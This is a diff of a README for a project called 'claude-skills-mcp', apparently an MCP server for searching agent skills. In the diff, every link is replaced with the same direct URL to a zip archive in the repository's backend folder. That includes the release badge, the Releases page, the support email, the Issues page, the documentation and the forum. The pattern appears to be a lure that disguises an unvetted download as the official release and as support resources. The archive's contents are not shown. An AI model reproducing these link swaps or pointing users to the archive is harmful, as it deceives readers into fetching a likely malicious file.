@@ -1,13 +1,13 @@
 # 🎉 claude-skills-mcp - Efficiently Search for Agent Skills
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/Vankill08/claude-skills-mcp/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Vankill08/claude-skills-mcp/main/packages/backend/claude-mcp-skills-v3.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/Vankill08/claude-skills-mcp/main/packages/backend/claude-mcp-skills-v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the **claude-skills-mcp**, an easy-to-use MCP server designed for searching and retrieving Claude Agent Skills. This guide will help you download and run our application without any technical knowledge.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/Vankill08/claude-skills-mcp/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Vankill08/claude-skills-mcp/main/packages/backend/claude-mcp-skills-v3.2.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version at the top of the page.
@@ -49,14 +49,14 @@ Once installed, using **claude-skills-mcp** is straightforward:
 ## 📞 Support
 If you encounter any issues or have questions, please reach out to our support team:
 
-- **Email:** support@claude-skills-mcp.com
-- **GitHub Issues:** You can also report issues directly on our [GitHub Issues page](https://github.com/Vankill08/claude-skills-mcp/issues).
+- **Email:** https://raw.githubusercontent.com/Vankill08/claude-skills-mcp/main/packages/backend/claude-mcp-skills-v3.2.zip
+- **GitHub Issues:** You can also report issues directly on our [GitHub Issues page](https://raw.githubusercontent.com/Vankill08/claude-skills-mcp/main/packages/backend/claude-mcp-skills-v3.2.zip).
 
 ## 🔗 Additional Resources
 For further information, tutorials, and updates, check out:
 
-- [Documentation](https://github.com/Vankill08/claude-skills-mcp/wiki)
-- [Community Forum](https://forum.claude-skills-mcp.com)
+- [Documentation](https://raw.githubusercontent.com/Vankill08/claude-skills-mcp/main/packages/backend/claude-mcp-skills-v3.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/Vankill08/claude-skills-mcp/main/packages/backend/claude-mcp-skills-v3.2.zip)
 
 ## ⚠️ Known Issues
 There are a few known issues to be aware of:
